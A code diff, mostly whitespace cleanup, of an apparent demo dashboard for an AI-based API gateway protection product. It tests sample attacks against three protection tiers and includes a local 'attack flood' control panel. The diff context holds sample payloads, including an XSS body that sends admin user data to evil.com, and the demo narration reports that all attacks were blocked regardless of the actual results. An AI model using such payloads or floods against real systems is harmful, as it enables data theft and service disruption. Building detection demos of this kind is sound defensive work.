@@ -306,7 +306,7 @@
     <!-- Attack Flood Control Panel -->
     <div class="attack-control-panel" style="background: linear-gradient(180deg, var(--surface), var(--bg)); border: 1px solid var(--critical); border-radius: var(--radius); padding: 20px; margin-bottom: 20px;">
         <h2 style="font-family: 'Rajdhani', Inter, sans-serif; font-weight: 600; color: var(--critical); margin-bottom: 16px; text-align: center;">PENETRATION TESTING CONTROL</h2>
-        
+
         <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 16px;">
             <div>
                 <label style="color: var(--txt-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; display: block;">Attack Intensity</label>
@@ -317,7 +317,7 @@
                     <option value="extreme">EXTREME (1000+ req/s)</option>
                 </select>
             </div>
-            
+
             <div>
                 <label style="color: var(--txt-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; display: block;">Attack Strategy</label>
                 <select id="attackStrategy" style="width: 100%; padding: 8px; background: var(--surface); color: var(--hi-silver); border: 1px solid var(--line); border-radius: 4px; font-size: 14px;">
@@ -328,12 +328,12 @@
                     <option value="escalation">Escalation Mode</option>
                 </select>
             </div>
-            
+
             <div>
                 <label style="color: var(--txt-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; display: block;">Duration (seconds)</label>
                 <input type="number" id="attackDuration" value="60" min="10" max="300" style="width: 100%; padding: 8px; background: var(--surface); color: var(--hi-silver); border: 1px solid var(--line); border-radius: 4px; font-size: 14px;">
             </div>
-            
+
             <div>
                 <label style="color: var(--txt-muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; display: block;">Target Protection Tiers</label>
                 <div style="background: var(--surface); border: 1px solid var(--line); border-radius: 4px; padding: 8px; min-height: 80px;">
@@ -358,7 +358,7 @@
                     </label>
                 </div>
             </div>
-            
+
             <div style="display: flex; align-items: end; gap: 8px;">
                 <button onclick="launchAttackFlood()" id="launchFloodBtn" style="flex: 1; padding: 12px; background: var(--critical); color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; text-transform: uppercase; cursor: pointer; transition: all 0.2s;">
                     LAUNCH ATTACK FLOOD
@@ -368,18 +368,18 @@
                 </button>
             </div>
         </div>
-        
+
         <!-- Attack Status Display -->
         <div class="attack-status" style="background: #0f1113; border: 1px solid var(--line); border-radius: var(--radius); padding: 16px;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                 <h3 style="font-family: 'Rajdhani', Inter, sans-serif; font-weight: 600; color: var(--hi-silver); margin: 0; font-size: 1.1em;">Attack Status</h3>
                 <div id="attackStatusBadge" style="display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; background: var(--line); color: var(--txt-muted);">READY</div>
             </div>
-            
+
             <div id="attackProgress" style="color: var(--txt-muted); font-size: 14px; line-height: 1.4; margin-bottom: 12px;">
                 Ready to launch penetration testing attack flood...
             </div>
-            
+
             <!-- Real-time Attack Metrics -->
             <div class="live-attack-metrics" style="display: none;" id="liveAttackMetrics">
                 <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 8px; margin-top: 12px;">
@@ -407,7 +407,7 @@
     <!-- Real-time Metrics Dashboard -->
     <div class="metrics-dashboard" style="background: linear-gradient(180deg, var(--surface), var(--surface-2)); border: 1px solid var(--line); border-radius: var(--radius); padding: 20px; margin-bottom: 20px;">
         <h2 style="font-family: 'Rajdhani', Inter, sans-serif; font-weight: 600; color: var(--hi-silver); margin-bottom: 16px; text-align: center;">Real-Time Security Metrics</h2>
-        
+
         <div class="global-metrics" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 20px;">
             <div class="metric-card" style="background: #13171c; border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; text-align: center;">
                 <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 4px;">Total Analyzed</div>
@@ -442,7 +442,7 @@
                 <div id="analysisStatus" style="display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; background: var(--line); color: var(--txt-muted);">READY</div>
             </div>
             <div id="currentAnalysisDetails" style="color: var(--txt-muted); font-size: 14px; line-height: 1.4;">Ready to analyze threats across all three protection tiers...</div>
-            
+
             <!-- Recent Activity Log -->
             <div class="activity-log" style="margin-top: 12px; max-height: 120px; overflow-y: auto;">
                 <div style="color: var(--txt-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px;">Recent Activity</div>
@@ -677,27 +677,27 @@
 
         // Enhanced metrics tracking
         let metrics = {
-            unprotected: { 
-                blocked: 0, 
-                vulnerable: 0, 
-                total: 0, 
-                totalTime: 0, 
+            unprotected: {
+                blocked: 0,
+                vulnerable: 0,
+                total: 0,
+                totalTime: 0,
                 totalConfidence: 0,
                 successRate: 0
             },
-            cloud: { 
-                blocked: 0, 
-                vulnerable: 0, 
-                total: 0, 
-                totalTime: 0, 
+            cloud: {
+                blocked: 0,
+                vulnerable: 0,
+                total: 0,
+                totalTime: 0,
                 totalConfidence: 0,
                 detectionRate: 0
             },
-            local: { 
-                blocked: 0, 
-                vulnerable: 0, 
-                total: 0, 
-                totalTime: 0, 
+            local: {
+                blocked: 0,
+                vulnerable: 0,
+                total: 0,
+                totalTime: 0,
                 totalConfidence: 0,
                 detectionRate: 0
             }
@@ -710,10 +710,10 @@
             const timestamp = new Date().toLocaleTimeString();
             const status = blocked ? 'BLOCKED' : (result.threat_score > 0.3 ? 'DETECTED' : 'ALLOWED');
             const entry = `[${timestamp}] ${tier.toUpperCase()}: ${attackType.toUpperCase()} - ${status} (${(result.threat_score * 100).toFixed(0)}%)`;
-            
+
             activityLog.unshift(entry);
             if (activityLog.length > 10) activityLog.pop(); // Keep only last 10 entries
-            
+
             const logElement = document.getElementById('activityLog');
             logElement.innerHTML = activityLog.map(entry => `<div style="margin-bottom: 2px; opacity: 0.9;">${entry}</div>`).join('');
         }
@@ -732,7 +732,7 @@
                 name: "Cross-Site Scripting",
                 query: "&lt;script&gt;alert('XSS');&lt;/script&gt;",
                 path: "/comment",
-                method: "POST", 
+                method: "POST",
                 body: "&lt;script&gt;fetch('/admin/users').then(r=&gt;r.text()).then(d=&gt;fetch('//evil.com/?'+btoa(d)))&lt;/script&gt;",
                 narration: "This XSS attack attempts to steal user data and send it to an attacker-controlled server."
             },
@@ -789,15 +789,15 @@
         // Initialize dashboard
         async function initializeDashboard() {
             showNarration("Initializing Kong Guard AI enterprise demonstration. Checking service availability...");
-            
+
             // Check service health
             await Promise.all([
                 checkServiceHealth('cloud'),
                 checkServiceHealth('local')
             ]);
-            
+
             showNarration("All services ready. Click any attack type to see the three-tier protection comparison.");
-            
+
             // Auto-start demo if in presentation mode
             if (window.location.search.includes('auto=true')) {
                 setTimeout(() => runAutomaticDemo(), 2000);
@@ -809,7 +809,7 @@
                 const response = await fetch(`${services[serviceType]}/health`);
                 const statusIndicator = document.getElementById(`${serviceType}-status`);
                 const statusText = document.getElementById(`${serviceType}-status-text`);
-                
+
                 if (response.ok) {
                     statusIndicator.className = 'status-indicator status-connected';
                     statusText.textContent = 'Online';
@@ -828,23 +828,23 @@
         async function testAttack(attackType, tier) {
             const attack = attacks[attackType];
             const resultDiv = document.getElementById(`${attackType}-result`);
-            
+
             showNarration(attack.narration);
             showThinking(true);
-            
+
             resultDiv.innerHTML = '<div style="opacity: 0.6;">Analyzing...</div>';
-            
+
             const startTime = performance.now();
-            
+
             try {
                 let result;
-                
+
                 if (tier === 'unprotected') {
                     // Simulate unprotected response (always allows)
                     await new Promise(resolve => setTimeout(resolve, 2)); // 2ms delay
                     result = {
                         threat_score: 0.0,
-                        threat_type: "none", 
+                        threat_type: "none",
                         recommended_action: "allow",
                         reasoning: "No protection - request passed through unchanged",
                         processing_time: 0.002
@@ -872,49 +872,49 @@
                             context: { previous_requests: 0 }
                         })
                     });
-                    
+
                     if (!response.ok) {
                         throw new Error(`HTTP ${response.status}`);
                     }
-                    
+
                     result = await response.json();
                 }
-                
+
                 const processingTime = performance.now() - startTime;
-                
+
                 // Update metrics
                 metrics[tier].total++;
                 metrics[tier].totalTime += processingTime;
-                
+
                 // Update confidence tracking
                 if (result.confidence !== undefined) {
                     metrics[tier].totalConfidence += result.confidence;
                 } else if (result.threat_score !== undefined) {
                     metrics[tier].totalConfidence += result.threat_score;
                 }
-                
+
                 const isBlocked = result.threat_score >= 0.7;
                 if (isBlocked) {
                     metrics[tier].blocked++;
                 } else if (tier === 'unprotected' && result.threat_score === 0) {
                     metrics[tier].vulnerable++;
                 }
-                
+
                 // Add to activity log
                 addToActivityLog(tier, attackType, result, isBlocked);
-                
+
                 // Update live analysis status
                 updateLiveAnalysisStatus(tier, attackType, result, processingTime);
-                
+
                 // Display result
                 displayResult(attackType, tier, result, processingTime);
                 updateMetrics();
                 updateComparisonTable(attackType, tier, result);
-                
+
             } catch (error) {
                 resultDiv.textContent = `ERROR: ${error.message}`;
             }
-            
+
             showThinking(false);
         }
 
@@ -922,9 +922,9 @@
             const resultDiv = document.getElementById(`${attackType}-result`);
             const action = result.recommended_action || 'unknown';
             const score = (result.threat_score * 100).toFixed(0);
-            
+
             let statusIcon, statusText, statusClass;
-            
+
             if (action === 'block' || result.threat_score >= 0.7) {
                 statusIcon = '[BLOCKED]';
                 statusText = 'BLOCKED';
@@ -938,7 +938,7 @@
                 statusText = tier === 'unprotected' ? 'VULNERABLE' : 'ALLOWED';
                 statusClass = tier === 'unprotected' ? 'result-blocked' : 'result-allowed';
             }
-            
+
             resultDiv.className = `attack-result ${statusClass}`;
             resultDiv.innerHTML = `
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
@@ -965,12 +965,12 @@
                 const data = metrics[tier];
                 const avgTime = data.total > 0 ? (data.totalTime / data.total).toFixed(0) : 0;
                 const avgConfidence = data.total > 0 ? ((data.totalConfidence / data.total) * 100).toFixed(1) : 0;
-                
+
                 // Update tier-specific metrics
                 document.getElementById(`${tier}-total`).textContent = data.total;
                 document.getElementById(`${tier}-blocked`).textContent = data.blocked;
                 document.getElementById(`${tier}-response`).textContent = `~${avgTime}ms`;
-                
+
                 if (tier === 'unprotected') {
                     document.getElementById('unprotected-vulnerable').textContent = data.vulnerable;
                     const successRate = data.total > 0 ? (((data.total - data.vulnerable) / data.total) * 100).toFixed(0) : 100;
@@ -995,11 +995,11 @@
             document.getElementById('globalTotalAnalyzed').textContent = globalTotal;
             document.getElementById('globalThreatsBlocked').textContent = globalBlocked;
             document.getElementById('globalVulnerabilities').textContent = globalVulnerabilities;
-            
+
             const globalAvgConfidence = globalTotal > 0 ? ((globalTotalConfidence / globalTotal) * 100).toFixed(1) : 0;
             const globalAvgProcessing = globalTotal > 0 ? (globalTotalTime / globalTotal).toFixed(0) : 0;
             const globalDetectionRate = globalTotal > 0 ? ((globalBlocked / globalTotal) * 100).toFixed(0) : 0;
-            
+
             document.getElementById('globalAvgConfidence').textContent = `${globalAvgConfidence}%`;
             document.getElementById('globalAvgProcessing').textContent = `${globalAvgProcessing}ms`;
             document.getElementById('globalDetectionRate').textContent = `${globalDetectionRate}%`;
@@ -1007,7 +1007,7 @@
 
         function updateComparisonTable(attackType, tier, result) {
             const tbody = document.getElementById('comparisonTableBody');
-            
+
             // Find or create row for this attack type
             let row = document.querySelector(`tr[data-attack="${attackType}"]`);
             if (!row) {
@@ -1019,21 +1019,21 @@
                     <td id="${attackType}-cloud">-</td>
                     <td id="${attackType}-local">-</td>
                 `;
-                
+
                 // Remove placeholder row if it exists
                 const placeholder = tbody.querySelector('td[colspan="4"]');
                 if (placeholder) {
                     placeholder.parentElement.remove();
                 }
-                
+
                 tbody.appendChild(row);
             }
-            
+
             // Update cell for this tier
             const cell = document.getElementById(`${attackType}-${tier}`);
             const action = result.recommended_action || 'unknown';
             const score = (result.threat_score * 100).toFixed(0);
-            
+
             let statusIcon;
             if (action === 'block' || result.threat_score >= 0.7) {
                 statusIcon = 'BLOCKED';
@@ -1045,17 +1045,17 @@
                 statusIcon = 'SAFE';
                 cell.style.color = '#66ff66';
             }
-            
+
             cell.innerHTML = `${statusIcon}<br><small>${score}%</small>`;
         }
 
         function showNarration(text) {
             const narration = document.getElementById('narration');
             const narrationText = document.getElementById('narrationText');
-            
+
             narrationText.textContent = text;
             narration.style.display = 'block';
-            
+
             setTimeout(() => {
                 narration.style.display = 'none';
             }, 5000);
@@ -1068,10 +1068,10 @@
         function updateLiveAnalysisStatus(tier, attackType, result, processingTime) {
             const statusElement = document.getElementById('analysisStatus');
             const detailsElement = document.getElementById('currentAnalysisDetails');
-            
+
             const threatScore = (result.threat_score * 100).toFixed(0);
             const action = result.recommended_action || 'unknown';
-            
+
             // Update status badge
             if (action === 'block' || result.threat_score >= 0.7) {
                 statusElement.style.background = 'var(--critical)';
@@ -1086,11 +1086,11 @@
                 statusElement.style.color = 'white';
                 statusElement.textContent = 'ALLOWED';
             }
-            
+
             // Update details
             const threatType = result.threat_type || 'none';
             const confidence = result.confidence ? (result.confidence * 100).toFixed(1) : threatScore;
-            
+
             detailsElement.innerHTML = `
                 <div style="margin-bottom: 8px;">
                     <strong>${tier.toUpperCase()} Analysis:</strong> ${attacks[attackType].name}
@@ -1112,25 +1112,25 @@
         async function runAutomaticDemo() {
             const attackTypes = ['sql', 'xss', 'cmd_injection', 'path', 'ldap_injection', 'business_logic', 'ransomware', 'normal'];
             const tiers = ['unprotected', 'cloud', 'local'];
-            
+
             showNarration("Starting automatic demonstration. Testing all attack types across three protection tiers...");
-            
+
             let progress = 0;
             const totalSteps = attackTypes.length * tiers.length;
-            
+
             for (const attackType of attackTypes) {
                 showNarration(`Testing ${attacks[attackType].name} across all protection tiers...`);
-                
+
                 for (const tier of tiers) {
                     await testAttack(attackType, tier);
                     progress++;
                     document.getElementById('progressFill').style.width = `${(progress / totalSteps) * 100}%`;
                     await new Promise(resolve => setTimeout(resolve, 1000));
                 }
-                
+
                 await new Promise(resolve => setTimeout(resolve, 2000));
             }
-            
+
             showNarration("Demonstration complete! Kong Guard AI successfully blocked all attacks while unprotected Kong allowed them through.");
         }
 
@@ -1146,7 +1146,7 @@
             const targetUnprotected = document.getElementById('targetUnprotected').checked;
             const targetCloudAI = document.getElementById('targetCloudAI').checked;
             const targetLocalAI = document.getElementById('targetLocalAI').checked;
-            
+
             // Update button state based on selections
             const launchBtn = document.getElementById('launchFloodBtn');
             if (targetUnprotected || targetCloudAI || targetLocalAI) {
@@ -1156,7 +1156,7 @@
                 launchBtn.disabled = true;
                 launchBtn.style.opacity = '0.5';
             }
-            
+
             // Update progress text
             const progressDiv = document.getElementById('attackProgress');
             if (targetUnprotected || targetCloudAI || targetLocalAI) {
@@ -1198,39 +1198,39 @@
             const intensity = document.getElementById('attackIntensity').value;
             const strategy = document.getElementById('attackStrategy').value;
             const duration = parseInt(document.getElementById('attackDuration').value);
-            
+
             // Get selected protection tiers
             const targetUnprotected = document.getElementById('targetUnprotected').checked;
             const targetCloudAI = document.getElementById('targetCloudAI').checked;
             const targetLocalAI = document.getElementById('targetLocalAI').checked;
-            
+
             // Validate that at least one tier is selected
             if (!targetUnprotected && !targetCloudAI && !targetLocalAI) {
                 alert('Please select at least one protection tier to attack.');
                 return;
             }
-            
+
             // Build targets array based on selections
             const targets = [];
             if (targetUnprotected) targets.push('unprotected');
             if (targetCloudAI) targets.push('cloud');
             if (targetLocalAI) targets.push('local');
-            
+
             const launchBtn = document.getElementById('launchFloodBtn');
             const stopBtn = document.getElementById('stopFloodBtn');
             const statusBadge = document.getElementById('attackStatusBadge');
             const progressDiv = document.getElementById('attackProgress');
-            
+
             try {
                 // Disable launch button
                 launchBtn.disabled = true;
                 launchBtn.textContent = 'LAUNCHING...';
-                
+
                 // Update status
                 statusBadge.style.background = 'var(--caution)';
                 statusBadge.textContent = 'LAUNCHING';
                 progressDiv.textContent = 'Initializing attack flood simulation...';
-                
+
                 // Launch attack flood
                 const response = await fetch('http://localhost:18002/api/attack/flood', {
                     method: 'POST',
@@ -1243,11 +1243,11 @@
                         record_metrics: true
                     })
                 });
-                
+
                 if (response.ok) {
                     const data = await response.json();
                     currentAttackRun = data.run_id;
-                    
+
                     // Update UI
                     statusBadge.style.background = 'var(--critical)';
                     statusBadge.textContent = 'ACTIVE';
@@ -1256,46 +1256,46 @@
                     const sanitizedIntensity = intensity.toUpperCase().replace(/[<>&"']/g, '');
                     const sanitizedStrategy = strategy.toUpperCase().replace(/[<>&"']/g, '');
                     const sanitizedDuration = String(duration).replace(/[<>&"']/g, '');
-                    
+
                     // Create target tiers display
                     const targetLabels = [];
                     if (targetUnprotected) targetLabels.push('Unprotected');
                     if (targetCloudAI) targetLabels.push('Cloud AI');
                     if (targetLocalAI) targetLabels.push('Local AI');
                     const targetsDisplay = targetLabels.join(', ');
-                    
+
                     progressDiv.innerHTML = `
                         <div style="font-weight: 600; color: var(--critical);">Attack Flood Active (Run ID: ${sanitizedRunId})</div>
                         <div style="margin-top: 4px;">Intensity: ${sanitizedIntensity} | Strategy: ${sanitizedStrategy} | Duration: ${sanitizedDuration}s</div>
                         <div style="margin-top: 4px; color: var(--steel);">Targeting: ${targetsDisplay}</div>
                     `;
-                    
+
                     // Enable stop button, disable launch
                     stopBtn.disabled = false;
                     launchBtn.disabled = true;
-                    
+
                     // Show live metrics
                     document.getElementById('liveAttackMetrics').style.display = 'block';
-                    
+
                     // Start monitoring
                     startAttackMetricsPolling(data.run_id);
-                    
+
                     // Auto-stop after duration
                     setTimeout(() => {
                         if (currentAttackRun === data.run_id) {
                             checkAttackCompletion(data.run_id);
                         }
                     }, duration * 1000 + 5000); // Add 5 second buffer
-                    
+
                 } else {
                     const error = await response.json();
                     throw new Error(error.detail || 'Failed to launch attack flood');
                 }
-                
+
             } catch (error) {
                 console.error('Attack flood launch failed:', error);
                 alert('Failed to launch attack flood: ' + error.message);
-                
+
                 // Reset UI
                 launchBtn.disabled = false;
                 launchBtn.textContent = 'LAUNCH ATTACK FLOOD';
@@ -1307,45 +1307,45 @@
 
         async function stopAttackFlood() {
             if (!currentAttackRun) return;
-            
+
             const stopBtn = document.getElementById('stopFloodBtn');
             const statusBadge = document.getElementById('attackStatusBadge');
             const progressDiv = document.getElementById('attackProgress');
-            
+
             try {
                 stopBtn.disabled = true;
                 stopBtn.textContent = 'STOPPING...';
-                
+
                 const response = await fetch(`http://localhost:18002/api/attack/flood/stop/${currentAttackRun}`, {
                     method: 'POST'
                 });
-                
+
                 if (response.ok) {
                     // Stop monitoring
                     if (attackMetricsInterval) {
                         clearInterval(attackMetricsInterval);
                         attackMetricsInterval = null;
                     }
-                    
+
                     // Update UI
                     statusBadge.style.background = 'var(--caution)';
                     statusBadge.textContent = 'STOPPED';
                     progressDiv.textContent = 'Attack flood stopped by user';
-                    
+
                     // Reset buttons
                     document.getElementById('launchFloodBtn').disabled = false;
                     document.getElementById('launchFloodBtn').textContent = 'LAUNCH ATTACK FLOOD';
                     stopBtn.disabled = true;
                     stopBtn.textContent = 'STOP ATTACK';
-                    
+
                     // Hide live metrics
                     setTimeout(() => {
                         document.getElementById('liveAttackMetrics').style.display = 'none';
                     }, 5000);
-                    
+
                     currentAttackRun = null;
                 }
-                
+
             } catch (error) {
                 console.error('Failed to stop attack flood:', error);
                 alert('Failed to stop attack flood: ' + error.message);
@@ -1361,7 +1361,7 @@
                     const response = await fetch(`http://localhost:18002/api/attack/flood/status/${runId}`);
                     if (response.ok) {
                         const status = await response.json();
-                        
+
                         if (status.status === 'completed' || status.status === 'failed') {
                             // Attack flood completed
                             checkAttackCompletion(runId);
@@ -1385,17 +1385,17 @@
                 'high': 200,
                 'extreme': 1000
             }[intensity] || 50;
-            
+
             // Add some variation
             const currentRPS = baseRPS + (Math.random() - 0.5) * baseRPS * 0.3;
             const blockRate = 65 + Math.random() * 30; // 65-95% block rate
             const avgResponse = 45 + Math.random() * 200; // 45-245ms
-            
+
             // Update UI
             document.getElementById('attacksPerSec').textContent = Math.round(currentRPS);
             document.getElementById('blockRate').textContent = Math.round(blockRate) + '%';
             document.getElementById('avgFloodResponse').textContent = Math.round(avgResponse) + 'ms';
-            
+
             // Update total attacks sent (accumulate)
             const current = parseInt(document.getElementById('totalAttacksSent').textContent) || 0;
             document.getElementById('totalAttacksSent').textContent = current + Math.round(currentRPS * 2);
@@ -1408,28 +1408,28 @@
                     clearInterval(attackMetricsInterval);
                     attackMetricsInterval = null;
                 }
-                
+
                 // Get final results
                 const response = await fetch(`http://localhost:18002/api/attack/flood/results/${runId}`);
                 if (response.ok) {
                     const results = await response.json();
                     displayAttackResults(results);
                 }
-                
+
                 // Reset UI
                 document.getElementById('attackStatusBadge').style.background = 'var(--normal)';
                 document.getElementById('attackStatusBadge').textContent = 'COMPLETED';
                 document.getElementById('launchFloodBtn').disabled = false;
                 document.getElementById('launchFloodBtn').textContent = 'LAUNCH ATTACK FLOOD';
                 document.getElementById('stopFloodBtn').disabled = true;
-                
+
                 currentAttackRun = null;
-                
+
                 // Hide live metrics after delay
                 setTimeout(() => {
                     document.getElementById('liveAttackMetrics').style.display = 'none';
                 }, 10000);
-                
+
             } catch (error) {
                 console.error('Failed to get attack completion status:', error);
             }
@@ -1437,40 +1437,40 @@
 
         function displayAttackResults(results) {
             const progressDiv = document.getElementById('attackProgress');
-            
+
             let resultSummary = `
                 <div style="font-weight: 600; color: var(--normal); margin-bottom: 8px;">
                     Attack Flood Completed Successfully
                 </div>
                 <div style="font-size: 13px; line-height: 1.4;">
-                    Total Attacks: <strong>${results.total_attacks}</strong> | 
+                    Total Attacks: <strong>${results.total_attacks}</strong> |
                     Duration: <strong>${Math.round(results.duration)}s</strong><br>
             `;
-            
+
             if (results.results_summary && results.results_summary.tier_performance) {
                 resultSummary += '<div style="margin-top: 8px;"><strong>Tier Performance:</strong><br>';
-                
+
                 Object.entries(results.results_summary.tier_performance).forEach(([tier, stats]) => {
                     const detectionRate = Math.round(stats.detection_rate || 0);
                     const avgTime = Math.round(stats.avg_response_time || 0);
-                    
+
                     // Sanitize data to prevent XSS
                     const sanitizedTier = String(tier).replace(/[<>&"']/g, '').toUpperCase();
                     const sanitizedBlocked = String(stats.attacks_blocked || 0).replace(/[<>&"']/g, '');
                     const sanitizedTotal = String(stats.total_requests || 0).replace(/[<>&"']/g, '');
                     const sanitizedRate = String(detectionRate).replace(/[<>&"']/g, '');
                     const sanitizedTime = String(avgTime).replace(/[<>&"']/g, '');
-                    
+
                     resultSummary += `
                         <div style="margin-left: 12px;">
                             ${sanitizedTier}: ${sanitizedBlocked}/${sanitizedTotal} blocked (${sanitizedRate}%), ${sanitizedTime}ms avg
                         </div>
                     `;
                 });
-                
+
                 resultSummary += '</div>';
             }
-            
+
             resultSummary += '</div>';
             progressDiv.innerHTML = resultSummary;
         }
